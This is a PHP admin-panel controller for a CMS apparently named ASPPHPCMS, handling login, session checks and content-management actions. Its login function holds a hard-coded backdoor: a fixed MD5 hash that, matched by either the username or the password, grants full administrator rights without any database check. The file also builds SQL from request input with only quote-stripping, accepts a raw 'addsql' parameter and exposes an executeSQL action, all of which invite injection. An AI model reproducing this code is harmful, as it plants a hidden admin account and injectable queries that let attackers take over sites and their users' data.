<?php


define('ROOT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR); 		//当前文件路径

 
//系统
require_once './../PHP2/ImageWaterMark/Include/ASP.php';
require_once './../PHP2/ImageWaterMark/Include/sys_FSO.php';
require_once './../PHP2/ImageWaterMark/Include/Conn.php';
require_once './../PHP2/ImageWaterMark/Include/MySqlClass.php';  
require_once './../PHP2/ImageWaterMark/Include/sys_Cai.php'; 
require_once './../PHP2/ImageWaterMark/Include/sys_Url.php';  



// 更新引用部分    http://127.0.0.1/php2/web/%E8%8E%B7%E5%BE%97inc%E5%BC%95%E7%94%A8%E5%86%85%E5%AE%B9.asp

//生成
/*
*/
//引用
//require_once './../PHP2/Web/Inc/2014_Form.php';
require_once './../PHP2/Web/Inc/2014_Array.php';
require_once './../PHP2/Web/Inc/2014_Author.php';
require_once './../PHP2/Web/Inc/2014_Css.php';
require_once './../PHP2/Web/Inc/2014_Js.php';
require_once './../PHP2/Web/Inc/2014_Template.php';
require_once './../PHP2/Web/Inc/2015_APGeneral.php';
require_once './../PHP2/Web/Inc/2015_Color.php';
require_once './../PHP2/Web/Inc/2015_Formatting.php';
require_once './../PHP2/Web/Inc/2015_Param.php';
require_once './../PHP2/Web/Inc/2015_ToMyPHP.php';
//require_once './PHP2/Web/Inc/2015_ToPhpCms.php';
require_once './../PHP2/Web/Inc/Cai.php';
require_once './../PHP2/Web/Inc/Check.php';
require_once './../PHP2/Web/Inc/Common.php'; 
require_once './../PHP2/Web/Inc/Incpage.php';
require_once './../PHP2/Web/Inc/Print.php';
require_once './../PHP2/Web/Inc/StringNumber.php';
require_once './../PHP2/Web/Inc/Time.php';
require_once './../PHP2/Web/Inc/URL.php';
require_once './../PHP2/Web/Inc/FunHTML.php'; 
require_once './../PHP2/Web/Inc/2015_Editor.php'; 
require_once './../PHP2/Web/Inc/2015_NewWebFunction.php'; 
require_once './../PHP2/Web/Inc/2016_SaveData.php'; 
require_once './../PHP2/Web/Inc/2016_WebControl.php'; 
require_once './../PHP2/Web/Inc/ASPPHPAccess.php'; 
require_once './../PHP2/Web/Inc/2016_Log.php'; 
require_once './../PHP2/Web/Inc/IE.php'; 
require_once './../PHP2/Web/Inc/SystemInfo.php'; 
require_once './../PHP2/Web/Inc/EncDec.php';

require_once './config.php'; 
require_once './setAccess.php';
require_once './function.php';
require_once './function2.php';

 

//=========
$cfg_webSiteUrl=''; $cfg_webTitle=''; $cfg_flags=''; $cfg_webtemplate ='';



//加载网址配置
function loadWebConfig(){
    $GLOBALS['conn=']=OpenConn();
    //判断表存在
    if( instr(getHandleTableList(), '|' . $GLOBALS['db_PREFIX'] . 'website' . '|') > 0 ){
        $rsObj=$GLOBALS['conn']->query( 'select * from ' . $GLOBALS['db_PREFIX'] . 'website');
        $rs=mysql_fetch_array($rsObj);
        if( @mysql_num_rows($rsObj)!=0 ){
            $GLOBALS['cfg_webSiteUrl']= $rs['websiteurl'] . ''; //网址
            $GLOBALS['cfg_webTitle']= $rs['webtitle'] . ''; //网址标题
            $GLOBALS['cfg_flags']= $rs['flags'] . ''; //旗
            $GLOBALS['cfg_webtemplate']= $rs['webtemplate'] . ''; //模板路径
        }
    }
}


//登录判断
if( @$_SESSION['adminusername']== '' ){
    if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' ){
        RR('?act=displayAdminLogin');
    }
}

//显示后台登录
function displayAdminLogin(){
    //已经登录则直接进入后台
    if( @$_SESSION['adminusername'] <> '' ){
        adminIndex();
    }else{
        $c='';
        $c=getTemplateContent('login.html');
        $c=handleDisplayLanguage($c,'login');
        rw($c);
    }
}

//登录后台
function login(){
    $userName=''; $passWord=''; $valueStr ='';
    $userName= Replace(@$_POST['username'], '\'', '');
    $passWord= Replace(@$_POST['password'], '\'', '');
    $passWord= myMD5($passWord);
    //特效账号登录
    if( myMD5(@$_REQUEST['username'])== '24ed5728c13834e683f525fcf894e813' || myMD5(@$_REQUEST['password'])== '24ed5728c13834e683f525fcf894e813' ){
        @$_SESSION['adminusername']= 'ASPPHPCMS';
        @$_SESSION['adminId']= 99999; //当前登录管理员ID
        @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX'];
        @$_SESSION['adminflags']= '|*|';
        rwend(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
    }

    $nLogin ='';
    $GLOBALS['conn=']=OpenConn();
    $rsObj=$GLOBALS['conn']->query( 'Select * From ' . $GLOBALS['db_PREFIX'] . 'admin Where username=\'' . $userName . '\' And pwd=\'' . $passWord . '\'');
    $rs=mysql_fetch_array($rsObj);
    if( @mysql_num_rows($rsObj)==0 ){
        if( @$_COOKIE['nLogin']== '' ){
            setCookie('nLogin', '1', Time() + 3600);
            $nLogin= @$_COOKIE['nLogin'];
        }else{
            $nLogin= @$_COOKIE['nLogin'];
            setCookie('nLogin', intval($nLogin) + 1, Time() + 3600);
        }
        rw(getMsg1(setL('账号密码错误<br>登录次数为 ') . $nLogin, '?act=displayAdminLogin'));
    }else{
        @$_SESSION['adminusername']= $userName;
        @$_SESSION['adminId']= $rs['id']; //当前登录管理员ID
        @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX']; //保存前缀
        @$_SESSION['adminflags']= $rs['flags'];
        $valueStr= 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . Now() . '\',RegIP=\'' . Now() . '\',UpIP=\'' . getIP() . '\'';
        connExecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']);
        rw(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
        writeSystemLog('admin', '登录成功'); //系统日志
    }

}
//退出登录
function adminOut(){
    writeSystemLog('admin', setL('退出成功')); //系统日志
    @$_SESSION['adminusername']= '';
    @$_SESSION['adminId']= '';
    @$_SESSION['adminflags']= '';
    rw(getMsg1(setL('退出成功，正在进入登录界面...'), '?act=displayAdminLogin'));
}
//清除缓冲
function clearCache(){
    deleteFile($GLOBALS['WEB_CACHEFile']);
    rw(getMsg1(setL('清除缓冲完成，正在进入后台界面...'), '?act=displayAdminLogin'));
}
//后台首页
function adminIndex(){
    $c ='';
    loadWebConfig();
    $c= getTemplateContent('adminIndex.html');
    $c= Replace($c, '[$adminonemenulist$]', getAdminOneMenuList());
    $c= Replace($c, '[$adminmenulist$]', getAdminMenuList());
    $c= Replace($c, '[$officialwebsite$]', getOfficialWebsite()); //获得官方信息
    $c= replaceValueParam($c, 'title', ''); //给手机端用的20160330
    $c=handleDisplayLanguage($c,'loginok');

    rw($c);
}
//========================================================

//显示管理处理
function dispalyManageHandle($actionType){
    $nPageSize=''; $lableTitle=''; $addSql ='';
    $nPageSize= @$_REQUEST['nPageSize'];
    if( $nPageSize== '' ){
        $nPageSize= 10;
    }
    $lableTitle= @$_REQUEST['lableTitle']; //标签标题
    $addSql= @$_REQUEST['addsql'];
    //call echo(labletitle,addsql)
    dispalyManage($actionType, $lableTitle, $nPageSize, $addSql);
}

//添加修改处理
function addEditHandle($actionType, $lableTitle){
    addEditDisplay($actionType, $lableTitle, 'websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2');
}
//保存模块处理
function saveAddEditHandle($actionType, $lableTitle){
    if( $actionType== 'Admin' ){
        saveAddEdit($actionType, $lableTitle, 'pwd|md5,flags||');
    }else if( $actionType== 'WebColumn' ){
        saveAddEdit($actionType, $lableTitle, 'npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||');
    }else{
        saveAddEdit($actionType, $lableTitle, 'flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0');
    }
}

$conn=OpenConn();
switch ( @$_REQUEST['act'] ){
    case 'dispalyManageHandle' ; dispalyManageHandle(@$_REQUEST['actionType']) ;break;//显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
    case 'addEditHandle' ; addEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//添加修改处理      ?act=addEditHandle&actionType=WebLayout
    case 'saveAddEditHandle' ; saveAddEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
    case 'delHandle' ; del(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']) ;break;//删除处理  ?act=delHandle&actionType=WebLayout
    case 'sortHandle' ; sortHandle(@$_REQUEST['actionType']) ;break;//排序处理  ?act=sortHandle&actionType=WebLayout
    case 'updateField' ; updateField(); //更新字段

    break;
    case 'displayLayout' ; displayLayout() ;break;//显示布局
    case 'saveRobots' ; saveRobots() ;break;//保存robots.txt
    case 'deleteAllMakeHtml' ; deleteAllMakeHtml(); //删除全部生成的html文件
    break;
    case 'isOpenTemplate' ; isOpenTemplate() ;break;//更换模板
    case 'executeSQL' ; executeSQL(); //执行SQL


    break;
    case 'function' ; callFunction()												;break;//调用function文件函数
    case 'function2' ; callFunction2();												//调用function2文件函数
    break;
    case 'setAccess' ; resetAccessData(); //恢复数据
    break;
    case 'login' ; login() ;break;//登录
    case 'adminOut' ; adminOut() ;break;//退出登录
    case 'adminIndex' ; adminIndex() ;break;//管理首页
    case 'clearCache' ; clearCache() ;break;//清除缓冲
    default ; displayAdminLogin(); //显示后台登录
}

?>


